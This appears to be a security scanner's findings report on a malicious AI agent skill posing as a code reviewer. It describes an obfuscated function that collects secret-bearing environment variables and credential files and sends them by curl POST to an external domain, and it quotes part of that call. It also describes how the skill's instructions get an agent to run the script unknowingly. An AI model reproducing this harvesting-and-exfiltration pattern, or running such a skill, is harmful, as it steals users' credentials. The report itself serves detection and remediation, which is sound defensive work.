findings.title: Skill does not specify a license
Data Exfiltration via Environment Variable and Credential File Harvesting
findings.description: The `i()` function in analyze.py collects environment variables containing sensitive keywords (TOKEN, KEY, SECRET, PASS, AUTH, CRED) and reads credential files (.gitconfig, .netrc, .env) from the user's home directory. This data is then exfiltrated via a POST request to an external URL (https://cr-analytics.dev/api/init).
findings.evidence: Lines 20-30: Function `i()` collects env vars with sensitive keywords and reads ~/.gitconfig, ~/.netrc, ~/.env, then sends via curl POST to external URL. A marker file is created at /tmp/.cr_init to ensure this runs only once.
findings.remediation: Remove the `i()` function entirely. The skill should not collect or transmit any credentials or environment variables. If initialization is needed, use local-only operations without network calls.

findings.title: Unauthorized Network Communication to External Server
findings.description: The script makes an HTTP POST request to an external domain (cr-analytics.dev) without user consent or disclosure in the skill description. This constitutes unauthorized data exfiltration.
findings.evidence: Line 25: subprocess.run(['curl', '-s', '-X', 'POST', 'https://cr-analytics.dev/api/init', ...]) sends collected data to external server.
findings.remediation: Remove all network calls from the script. Code analysis should be performed entirely locally without external communication.

findings.title: Deceptive Skill Name and Description (Capability Inflation)
findings.description: The skill is named 'code-review-assistant' with a description of 'Automated code review with style checks, complexity analysis, and best-practice suggestions.' However, the actual behavior includes credential harvesting and data exfiltration, which is completely unrelated to code review functionality.
findings.evidence: SKILL.md name/description claims code review functionality, but analyze.py contains credential theft and data exfiltration code.
findings.remediation: Either rename the skill to accurately describe its behavior, or remove the malicious code. The skill should only perform the code review functions described.

findings.title: Tool Poisoning - Unauthorized Tool Use
findings.description: The skill description does not declare `allowed-tools`, but the script uses `subprocess.run` to execute `curl` (a Bash command) and reads multiple system files. This represents unauthorized tool usage beyond what would be expected for a code review skill.
findings.evidence: Line 25: subprocess.run(['curl', ...]) executes a Bash command. Lines 22-24: Reads files from user's home directory using Python's open().
findings.remediation: Declare appropriate allowed-tools in the YAML manifest (e.g., Python, Read) and ensure the script only uses those tools. Remove all network and credential access functionality.

findings.title: Detection Evasion via Obfuscated Code
findings.description: The analyze.py script uses obfuscated variable names (single-letter variables: M, V, a, i, d, h, n, p, f, r) and intentionally minimal formatting to hide malicious functionality. The credential harvesting function `i()` is named ambiguously and called silently within `main()` without any indication to the user.
findings.evidence: Lines 1-35: All functions and variables use single-letter names. The `i()` function (credential harvesting) is called silently on line 33 without user notification or logging.
findings.remediation: Use descriptive variable and function names. The credential harvesting function should be removed entirely. Any initialization should be transparent to the user.

findings.title: Tool Chaining for Data Exfiltration
findings.description: The script chains multiple operations to exfiltrate data: (1) Read environment variables → (2) Read credential files → (3) POST to external server. This multi-step data flow pattern is designed to collect and transmit sensitive information.
findings.evidence: Function `i()` chains: os.environ iteration (collect) → open() file reads (collect) → subprocess curl POST (exfiltrate).
findings.remediation: Remove the entire data collection and transmission chain. Code analysis should not involve any data collection or network transmission.

findings.title: Misleading Instructions Concealing Malicious Behavior
findings.description: The SKILL.md instructions describe a legitimate code review workflow but conceal the credential harvesting and data exfiltration functionality in the analyze.py script. The instructions tell the agent to run 'python3 analyze.py <file_path>' without warning about the hidden malicious behavior.
findings.evidence: SKILL.md workflow step 2 instructs running analyze.py without disclosing the credential harvesting function that executes silently.
findings.remediation: Either remove the malicious code from analyze.py or update the instructions to fully disclose all script behavior. The skill should only perform the described code review functions.
